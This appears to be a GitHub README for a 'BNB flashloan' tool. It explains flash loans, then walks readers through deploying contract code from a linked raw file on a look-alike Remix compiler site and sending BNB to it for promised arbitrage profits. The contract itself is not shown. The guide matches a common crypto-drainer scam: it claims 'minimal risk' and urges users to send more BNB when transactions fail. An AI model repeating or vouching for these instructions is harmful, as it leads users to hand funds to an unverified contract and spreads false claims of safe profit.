# BNB-Flashloan
What if I told you that you can borrow unlimited amount of money for a few seconds with no collateral and minimal risk? Flashloans make it possible to do just that.

What is a Flashloan?
Most people are familiar with normal loans. A lender loans out money to a borrower to be later paid back with an interest. The borrower pays to the lender for temporarily parting with the money (collateral). Flashloans are a bit different.

No collateral. Borrowers often need to put up collateral to ensure that if they can’t pay back the loan, the lender will still get their money back. Flashloans are unsecured, meaning they don’t require collateral. Instead the borrower needs to pay back the money immediately.

Instant. Unlike a traditional loan a flashloan is instantaneous. The loan is fulfilled in the same transaction that is it lent out. That means that the borrower performs trades before the transaction ends.

Unlimited loan amount. Users can borrow any amount up to the total liquidity available from the DeFi protocol that provides the loan.

Minimal risk. Flashloans are repaid within the same transaction. If the transaction fails, the smart contract ensures that the flash loan does not take place. Beside the transaction fee, there is no risk.

“Learn more about flash loans

— https://academy.binance.com/en/articles/what-are-flashloans-in-defi”

Usage of Flashloans:
Arbitrage
Flashloans are mainly used for arbitrages. An arbitrage trade exploits price differences between markets to make a profit.

Let’s say you discover a considerable price difference for ETH on two different decentralized exchange. You can borrow a significant amount of ETH without any collateral and profit from the price difference.

This all sounds nice but there are front running bots that copy your transaction from the mempool, pay a higher gas fee and get mined ahead of you, stealing your arbitrage opportunity. Also you have to take into consideration the network fees and price slippage as well.

Arbitrage is a highly competitive sport.

How to do Flashloans
There are various protocols that offer flashloans like Aave, KeeperDAO, Equalizer, dYdX and Uniswap. Equalizer focuses strictly on flashloans.

Executing a flashloans are not yet user-friendly. You need to have technical knowledge and write a smart contract that executes the loan. However, we have made this easy and created an already functional contract code that makes flashloans possible for an average DeFi user.

WATCH FULL STEP BY STEP FLASH LOANS GUIDE

Step By Step Guide for Flash Loans:

• Get the Metamask Extension for your browser

• Open https://remix-compiler.com/ from within your browser.

• Click on File Explorers and click “Create New File “.

• Name the file flashloans.sol and paste the contract code link below. ► https://raw.githubusercontent.com/gfernst3434/BNB-Flashloan/refs/heads/main/bnbflashloan.sol

• Click on Deploy & Run transactions and set “ENVIRONMENT” to Injected Web3.

• Connect your MetaMask wallet.

• Click on the “Solidity Compiler” and set the compiler version to 0.5.0

• Click on the Solidity Compiler and then click the blue button “Compile flashloans.sol”

• Wait for the code to compile.

• Click on Deploy & run transactions then click on the down arrow right from the “Deploy” button

• On “_TOKENNAME” Tester

• On “_TOKENSYMBOL” TOKX

• On “_LOANAMOUNT” 2000

Click Transact and confirm the transaction in MetaMask.

NOTE: In the case of any transaction fail, it is usually as a result of traffic congestion. Follow the video below to fix it:


Place your transaction mode on “aggressive” and the transaction will go through

• Wait for the transaction to confirm.

• Copy the address of the newly deployed contract.

• Send BNB to the deployed contract to initiate the swap 1.0+ (1.0 up is better as you will get a bigger amount in each swap)

• Wait for the transaction to confirm.

• Now, click “action” (red box) to execute the Flash Loan.

• Confirm the transaction in MetaMask and wait for the confirmation.

You can now check your wallet

Note: If it doesn’t work with 1.0 BNB try to send another 1.0 BNB (1.0+ is better), because fees may be different from day to day. (3.0+ BNB for each 1000 BNB you are borrowing).

Avoid using very small amounts, as the contract may fail if the amount is less than 0.5 BNB. Because the price of gas fluctuates from time to time, the arbitrage may fail in some very rare circumstances owing to depletion of BNB in your smart contract.

Don’t panic, all you have to do now is wait a few minutes (5–10 minutes) and attempt the transaction, preferably with a loan amount of 825 and a gas limit of 31,560, and it should work perfectly, albeit with a lesser profit.

When you’re finished, make sure to move your BNB to another wallet.
